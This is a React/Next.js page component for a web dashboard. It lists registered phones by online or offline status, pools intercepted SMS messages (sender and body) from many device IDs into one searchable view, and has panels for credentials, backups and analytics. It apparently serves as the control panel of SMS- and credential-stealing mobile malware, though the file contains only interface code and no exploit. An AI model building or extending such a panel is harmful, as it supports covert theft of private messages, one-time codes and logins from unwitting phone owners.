
// app/page.js
'use client';

import { useState, useEffect } from 'react';
import { useAppContext } from './context/AppContext';
import TopBar from './components/TopBar';
import Sidebar from './components/Sidebar';
import DeviceCard from './components/DeviceCard';
import FavouritesCatalog from './components/FavouritesCatalog';
import CredentialsCatalog from './components/CredentialsCatalog';
import BackupPanel from './components/BackupPanel';
import AnalyticsPanel from './components/AnalyticsPanel';
import SmsModal from './components/SmsModal';
import BackupModal from './components/BackupModal';
import Toast from './components/Toast';
import MobileNav from './components/MobileNav';
import FabButton from './components/FabButton';
import styles from './page.module.css';

export default function HomePage() {
    const {
        isPanelOpen,
        togglePanel,
        deviceOffset,
        setDeviceOffset,
        currentFilter,
        setCurrentFilter,
        searchQuery,
        setSearchQuery,
        allDeviceKeys,
        deviceOnlineStatus,
        deviceSerialMap,
        deviceSmsCache,
        allDeviceKeys: getFilteredKeys,
        setFilteredKeys,
        allSmsList,
        setAllSmsList,
        allSmsOffset,
        setAllSmsOffset,
        smsFilterDevice,
        setSmsFilterDevice,
        data,
        isConnected,
        isFavourite,
        toggleFavourite,
        expandedDevices,
        toggleDevice,
        activeTabs,
        setTab,
        DELETE_PASSWORD,
        DEVICE_LIMIT
    } = useAppContext();

    const [filteredDeviceKeys, setFilteredDeviceKeys] = useState([]);
    const [searchInput, setSearchInput] = useState('');

    // Update filtered keys when search or filter changes
    useEffect(() => {
        const devices = data.user_data || {};
        let keys = Object.keys(devices);

        if (searchQuery) {
            const query = searchQuery.toLowerCase();
            keys = keys.filter(id => {
                const dev = devices[id] || {};
                const name = dev.d_name || dev.device_name || id;
                const serial = deviceSerialMap.get(id) || 0;
                return (id + ' ' + name + ' ' + serial).toLowerCase().includes(query);
            });
        }

        keys.sort((a, b) => {
            const serialA = deviceSerialMap.get(a) || 0;
            const serialB = deviceSerialMap.get(b) || 0;
            if (serialA === serialB) {
                return a.localeCompare(b);
            }
            return serialB - serialA;
        });

        if (currentFilter === 'online') {
            keys = keys.filter(id => deviceOnlineStatus.get(id) === true);
        } else if (currentFilter === 'offline') {
            keys = keys.filter(id => deviceOnlineStatus.get(id) === false);
        }

        setFilteredDeviceKeys(keys);
        setFilteredKeys(keys);
    }, [data, searchQuery, currentFilter, deviceOnlineStatus, deviceSerialMap, setFilteredKeys]);

    const handleSearch = (value) => {
        setSearchQuery(value.toLowerCase().trim());
        setDeviceOffset(0);
    };

    const clearSearch = () => {
        setSearchQuery('');
        setSearchInput('');
        setDeviceOffset(0);
    };

    const loadMoreDevices = () => {
        if (deviceOffset + DEVICE_LIMIT < filteredDeviceKeys.length) {
            setDeviceOffset(deviceOffset + DEVICE_LIMIT);
        }
    };

    const loadPrevDevices = () => {
        setDeviceOffset(Math.max(0, deviceOffset - DEVICE_LIMIT));
    };

    const filterDevices = (filter) => {
        setCurrentFilter(filter);
        setDeviceOffset(0);
    };

    return (
        <div className={styles.appWrapper}>
            <TopBar />
            <div className={styles.mainLayout}>
                <Sidebar />
                <main className={styles.contentArea}>
                    {/* Devices Panel */}
                    {isPanelOpen.devices && (
                        <div className={`${styles.panel} ${styles.active}`}>
                            <div className={styles.panelHeader}>
                                <div>
                                    <h2>
                                        <i className="fas fa-mobile-alt" style={{ color: 'var(--gold)' }}></i>
                                        Registered Devices
                                    </h2>
                                    <p className={styles.panelSub}>Click on any device to expand & view details</p>
                                </div>
                                <div className={styles.panelStats}>
                                    <button 
                                        className={`${styles.filterBtn} ${currentFilter === 'all' ? styles.active : ''}`}
                                        onClick={() => filterDevices('all')}
                                    >
                                        All
                                    </button>
                                    <button 
                                        className={`${styles.filterBtn} ${currentFilter === 'online' ? styles.active : ''}`}
                                        onClick={() => filterDevices('online')}
                                    >
                                        🟢 Online
                                    </button>
                                    <button 
                                        className={`${styles.filterBtn} ${currentFilter === 'offline' ? styles.active : ''}`}
                                        onClick={() => filterDevices('offline')}
                                    >
                                        🔴 Offline
                                    </button>
                                    <span className={styles.statItem}>
                                        <i className="fas fa-users"></i> 
                                        <span>{filteredDeviceKeys.length}</span>
                                    </span>
                                </div>
                            </div>

                            <div className={styles.searchContainer}>
                                <i className={`fas fa-search ${styles.searchIcon}`}></i>
                                <input
                                    type="text"
                                    className={styles.searchInput}
                                    placeholder="Search devices by ID, name, or serial..."
                                    value={searchInput}
                                    onChange={(e) => {
                                        setSearchInput(e.target.value);
                                        handleSearch(e.target.value);
                                    }}
                                    autoComplete="off"
                                />
                                {searchInput && (
                                    <button className={styles.searchClearBtn} onClick={clearSearch}>
                                        <i className="fas fa-times"></i>
                                    </button>
                                )}
                            </div>

                            <div id="devicesContainer">
                                {filteredDeviceKeys.length === 0 ? (
                                    <div className={styles.emptyLuxury}>
                                        <i className="fas fa-search empty-icon"></i>
                                        {searchQuery ? 'No devices match "' + searchQuery + '"' : 'No devices found'}
                                    </div>
                                ) : (
                                    <>
                                        {deviceOffset > 0 && (
                                            <button className={styles.btnLoadMore} onClick={loadPrevDevices}>
                                                <i className="fas fa-chevron-up"></i> Previous
                                            </button>
                                        )}
                                        
                                        {filteredDeviceKeys
                                            .slice(deviceOffset, deviceOffset + DEVICE_LIMIT)
                                            .map((devId, index) => (
                                                <DeviceCard
                                                    key={devId}
                                                    deviceId={devId}
                                                    index={deviceOffset + index}
                                                    isExpanded={expandedDevices.get(devId) || false}
                                                    onToggle={toggleDevice}
                                                    activeTab={activeTabs.get(devId) || null}
                                                    onSetTab={setTab}
                                                    isFavourite={isFavourite(devId)}
                                                    onToggleFavourite={toggleFavourite}
                                                />
                                            ))}
                                        
                                        {deviceOffset + DEVICE_LIMIT < filteredDeviceKeys.length && (
                                            <button className={styles.btnLoadMore} onClick={loadMoreDevices}>
                                                <i className="fas fa-chevron-down"></i> 
                                                Load More ({filteredDeviceKeys.length - deviceOffset - DEVICE_LIMIT} remaining)
                                            </button>
                                        )}
                                    </>
                                )}
                            </div>
                        </div>
                    )}

                    {/* Favourites Panel */}
                    {isPanelOpen.favourites && (
                        <div className={`${styles.panel} ${styles.active}`}>
                            <FavouritesCatalog />
                        </div>
                    )}

                    {/* SMS Panel */}
                    {isPanelOpen.sms && (
                        <div className={`${styles.panel} ${styles.active}`}>
                            <div className={styles.panelHeader}>
                                <div>
                                    <h2><i className="fas fa-envelope" style={{ color: 'var(--gold)' }}></i> All Messages</h2>
                                    <p className={styles.panelSub}>Click on device ID to filter messages</p>
                                </div>
                                <div className={styles.panelStats}>
                                    <span className={styles.statItem}>
                                        <i className="fas fa-envelope"></i> 
                                        <span>{allSmsList.length}</span>
                                    </span>
                                    {smsFilterDevice && (
                                        <button 
                                            className={styles.btnSm} 
                                            onClick={() => setSmsFilterDevice(null)}
                                            style={{ background: 'var(--red)', color: '#fff' }}
                                        >
                                            ✕ Clear Filter
                                        </button>
                                    )}
                                </div>
                            </div>
                            <div id="allSmsContainer">
                                {allSmsList.length === 0 ? (
                                    <div className={styles.emptyLuxury}>
                                        <i className="fas fa-inbox empty-icon"></i>
                                        No messages found
                                    </div>
                                ) : (
                                    <>
                                        {allSmsList
                                            .slice(0, allSmsOffset + 10)
                                            .map((msg, index) => (
                                                <div key={index} className={styles.smsCardLuxury}>
                                                    <div className={styles.smsHeader}>
                                                        <div className={styles.smsSender}>
                                                            <span 
                                                                className={styles.deviceTag}
                                                                onClick={() => setSmsFilterDevice(msg.deviceId)}
                                                            >
                                                                [{msg.deviceId}]
                                                            </span>
                                                            👤 {msg.sender}
                                                        </div>
                                                        <div className={styles.smsMeta}>
                                                            {msg.date_formatted || msg.date || ''}
                                                        </div>
                                                    </div>
                                                    <div className={styles.smsBody}>{msg.body}</div>
                                                </div>
                                            ))}
                                        
                                        {allSmsOffset + 10 < allSmsList.length && (
                                            <button 
                                                className={styles.btnLoadMore}
                                                onClick={() => setAllSmsOffset(allSmsOffset + 10)}
                                            >
                                                <i className="fas fa-chevron-down"></i> 
                                                Load More ({allSmsList.length - allSmsOffset - 10} remaining)
                                            </button>
                                        )}
                                    </>
                                )}
                            </div>
                        </div>
                    )}

                    {/* Credentials Panel */}
                    {isPanelOpen.credentials && (
                        <div className={`${styles.panel} ${styles.active}`}>
                            <CredentialsCatalog />
                        </div>
                    )}

                    {/* Backup Panel */}
                    {isPanelOpen.backup && (
                        <div className={`${styles.panel} ${styles.active}`}>
                            <BackupPanel />
                        </div>
                    )}

                    {/* Analytics Panel */}
                    {isPanelOpen.analytics && (
                        <div className={`${styles.panel} ${styles.active}`}>
                            <AnalyticsPanel />
                        </div>
                    )}
                </main>
            </div>

            <MobileNav />
            <FabButton />
            <SmsModal />
            <BackupModal />
            <Toast />
        </div>
    );
}
